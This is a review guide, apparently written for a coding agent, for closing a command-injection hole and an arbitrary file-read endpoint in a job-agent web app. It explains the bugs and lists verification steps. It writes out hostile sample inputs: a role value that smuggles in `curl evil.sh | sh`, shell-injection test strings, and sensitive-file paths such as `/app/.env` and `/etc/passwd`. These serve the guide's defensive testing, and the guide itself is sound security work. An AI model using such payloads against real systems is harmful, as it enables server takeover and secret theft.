# Review Guide 002: Close command injection and arbitrary file-read

Repo: emperorsegxy/ai-job-agent (default branch) | Status: written BEFORE implementation. "Done" = every MUST item below verified with evidence.

Likely files (confirm in the repo; do not treat this list as exhaustive):
- the JobSpy runner that shells out to Python (previously `jobspy-runner.ts` around the `exec(...)` call)
- `src/app/api/profile/update/route.ts`
- `src/app/api/profile/parse-local/route.ts`
- legacy Express handler in `index.ts` that accepts a local file path
- any UI or client that calls `/api/profile/parse-local`
- tests added for this change
- `package.json` / lockfile only if a schema validator is added

## 1. Problem

Two unauthenticated holes let a stranger take control of the server or read its files. The repo is public, so the code itself is the instruction manual.

A. Command injection (C1). The JobSpy runner builds one text command from the saved profile's roles and locations and hands it to `child_process.exec`, which runs a shell. Values are wrapped in quotes but never escaped. A role such as `x"; curl evil.sh | sh; "` becomes extra shell commands on the next scan. Those fields can be written through `POST /api/profile/update`, which has no auth and no schema validation.

B. Arbitrary file read (H1). `POST /api/profile/parse-local` (and the matching legacy Express path) takes a `localPath` from the request, reads that file, sends it to Gemini as a CV, and stores the result. A request with `/app/.env` or a service-account JSON exfiltrates secrets into the profile, which `GET /api/profile` then returns.

This change does **not** add API authentication. Routes may still be reachable without a login. The goal is only to stop shell takeover and file theft while that larger auth gap remains (tracked separately).

## 2. Intended behaviour

A. The scraper is started with `execFile` or `spawn` (argument array, no shell). A role or location is always a single argv item passed to Python and is never interpreted by a shell.

B. Payload strings that would be dangerous in a shell (`"; …`, `$(…)`, backticks, newlines, pipes, `&&`, quoted fragments) are stored (if they pass validation) and forwarded as literal text. They must not create files, run extra commands, or change which program is executed.

C. `POST /api/profile/update` validates the JSON body against a schema (Zod or equivalent already in the repo). Reject with HTTP 400 and do not write the profile when the body is malformed, oversized, contains control characters, or exceeds field counts/lengths.

D. Honest profile values still save and still produce a normal scan, including roles or locations that contain apostrophes or quotes (for example `O'Brien`, `C++`).

E. `/api/profile/parse-local` is removed (preferred) so the route returns 404. No UI, client, docs, or server code still calls it. The existing `/api/profile/upload` path remains the way to parse a CV.

F. The same file-read hole in the legacy Express `index.ts` path is closed (delete or equivalent 404), not left as a back door.

G. A repo-wide search shows no remaining `exec(` / `execSync(` / `spawn(..., { shell: true })` that interpolate user-controlled or profile-controlled strings into a shell command.

## 3. Scope limits (MUST NOT)

- Do not add Firebase/session auth, tokens, or per-user profiles. That is a later change.
- Do not keep `parse-local` behind a path jail or a `NODE_ENV !== 'production'` guard unless deletion is genuinely impossible (for example a documented local-dev workflow that would otherwise break). If you must keep it, say why in the PR and apply a strict directory jail plus basename-only resolution; deletion is the default.
- Do not change scoring, scraping filters, dashboard UI behaviour (except removing any parse-local caller), cron scheduling, or the signup-polling work on PR #1.
- Do not merge any pull request.
- Branch from the repository default branch, not from `fix/signup-polling` / PR #1.
- No unrelated refactors or formatting churn.
- Git commits must not include AI co-author attribution (no `Co-authored-by:` trailer for Cursor, Claude, or any AI).

## 4. Checklist (MUST unless marked SHOULD)

Code
- [ ] 1. JobSpy (and any other scraper spawn site) uses `execFile` or `spawn` with an argv array. The shell is not involved.
- [ ] 2. Role and location values are passed as separate arguments, never interpolated into a command string.
- [ ] 3. `POST /api/profile/update` parses the body with a schema: trimmed strings, max length (about 80 chars per role/location is a reasonable default), max array sizes, and rejection of control characters (including newlines).
- [ ] 4. Invalid bodies return 400 and leave the stored profile unchanged (verify by reading the profile before and after a rejected request).
- [ ] 5. `/api/profile/parse-local` is gone (404) or, only if deletion was impossible, locked to a single uploads directory with `path.resolve` + prefix check. Same for the legacy Express handler.
- [ ] 6. No remaining client, page, test, or docs reference that still expects parse-local to work (other than this review guide and the PR text).
- [ ] 7. Repo search (`rg` or equivalent) finds no other shell-out that builds a command from user/profile input.
- [ ] 8. SHOULD: timeout and `maxBuffer` stay in place (or are added) on the scraper child process so a stuck run cannot hang forever.

Behaviour (verify by running the app or a focused test; a unit/integration test that stubs the child process is acceptable for injection cases)
- [ ] 9. Injection payloads in role and/or location — at minimum `"; touch /tmp/pwned-rg002; "`, `$(touch /tmp/pwned-rg002-dollar)`, backticks around `touch /tmp/pwned-rg002-bt`, and an embedded newline — do not create those files and do not execute anything except the intended Python scraper. Evidence: test assertion and/or `ls` showing the files are absent after a scan attempt.
- [ ] 10. A normal scan with a benign role/location still returns jobs (or, if live JobSpy/network is unavailable, the runner still invokes Python with the expected argv and a fixture/stub succeeds). State clearly which of those you ran.
- [ ] 11. Roles with apostrophes or quotes (e.g. `O'Brien`, `C++ Engineer`) are passed through intact as argv and do not break the spawn.
- [ ] 12. Oversized field, extra unknown-critical junk if the schema rejects it, empty required arrays if applicable, and control-character strings are each rejected with 400 and no write.
- [ ] 13. `POST /api/profile/parse-local` with `localPath` set to a sensitive file (e.g. `package.json` or `/etc/passwd`) returns 404 (or 403 if jailed) and does not copy, parse, or store that file's contents.
- [ ] 14. Existing CV upload via `/api/profile/upload` still works (or is documented as NOT VERIFIED if Gemini/upload dependencies are missing, with the reason).

Quality gates
- [ ] 15. Production build and type check pass (`yarn build` / `npm run build` and the repo's typecheck script if one exists).
- [ ] 16. Existing tests pass; new tests cover items 9–13 where practical.
- [ ] 17. Diff reviewed: only files needed for this fix (plus this guide under `docs/review-guides/`). No drive-by edits.
- [ ] 18. PR description lists each checklist item with PASS / FAIL / NOT VERIFIED and evidence (command output, test names, or request results).
- [ ] 19. Commits have no AI co-author trailers.

## 5. Known risks to re-check

- Adding a dependency (e.g. Zod) is fine if nothing equivalent is already in the repo; prefer an existing validator if one is present.
- Argument injection against Python itself (`--help`, leading `-`) is out of scope unless a flag-like value would change the scraper's behaviour; prefixing user values after `--` is a SHOULD if the script uses a standard argv parser.
- Windows vs POSIX quoting is irrelevant once there is no shell, but confirm the spawn executable (`python3` vs `python`) still matches how the project already runs JobSpy.
- Legacy `src/public` / Express must not keep a working `localPath` reader after the Next route is deleted.

## 6. Done definition

All MUST items PASS with evidence recorded in the PR. Any item that could not be verified is reported explicitly as NOT VERIFIED with the reason, never silently skipped. Open a pull request against the default branch. Do not merge it.
